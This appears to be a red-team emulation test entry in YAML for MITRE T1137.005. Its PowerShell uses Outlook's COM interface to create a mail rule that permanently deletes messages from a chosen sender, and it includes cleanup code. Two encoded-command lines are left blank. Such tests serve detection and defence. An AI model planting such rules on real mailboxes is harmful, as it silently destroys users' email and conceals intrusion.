- id: 71fa933f-6489-56ce-acc0-69e1cddaa133
  name: Soumaia ART Tests - Outlook Rule - Sender Address Trigger with DeletePermanently Action via COM Object
  description: 'Creates an Outlook rule via COM that permanently deletes emails received

    from a specific sender address. Adversaries use sender-based triggers to

    make rules appear more legitimate (e.g. disguised as a filter for a

    specific colleague). Tests a different rule condition path through the

    COM object model. Uses DeletePermanently as it does not require a resolved

    Exchange folder unlike MoveToFolder.

    NOTE: This test MUST be run from a non-elevated (standard user) PowerShell

    session. Outlook COM fails with 0x80080005 when invoked as Administrator.'
  tactic: persistence
  technique:
    attack_id: T1137.005
    name: 'Office Application Startup: Outlook Rules'
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand 
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
          if ($isAdmin) {
              Write-Host "[-] This test must be run from a non-elevated PowerShell session."
              Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
              exit 1
          }

          $outlook   = New-Object -ComObject Outlook.Application
          $namespace = $outlook.GetNamespace("MAPI")
          $rules     = $namespace.DefaultStore.GetRules()
          $rule      = $rules.Create("AtomicTest_T1137005_SenderTrigger", 0)

          $cond = $rule.Conditions.From
          $cond.Enabled = $true
          $cond.Recipients.Add("atomictest@redteam.local")
          $cond.Recipients.ResolveAll() | Out-Null

          $action         = $rule.Actions.DeletePermanently
          $action.Enabled = $true

          $rule.Enabled = $true
          $rules.Save()
          Write-Host "[+] Sender-based rule 'AtomicTest_T1137005_SenderTrigger' created. Emails from 'atomictest@redteam.local' will be permanently deleted."
        cleanup: |-
          $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
          if ($isAdmin) {
              Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
              exit 1
          }
          $outlook   = New-Object -ComObject Outlook.Application
          $namespace = $outlook.GetNamespace("MAPI")
          $rules     = $namespace.DefaultStore.GetRules()
          $removed   = $false
          for ($i = $rules.Count; $i -ge 1; $i--) {
              if ($rules.Item($i).Name -eq "AtomicTest_T1137005_SenderTrigger") {
                  $rules.Remove($rules.Item($i).Name)
                  $removed = $true
              }
          }
          if ($removed) {
              $rules.Save()
              Write-Host "[+] All instances of rule 'AtomicTest_T1137005_SenderTrigger' removed."
          } else {
              Write-Host "[*] Rule 'AtomicTest_T1137005_SenderTrigger' not found - already removed."
          }
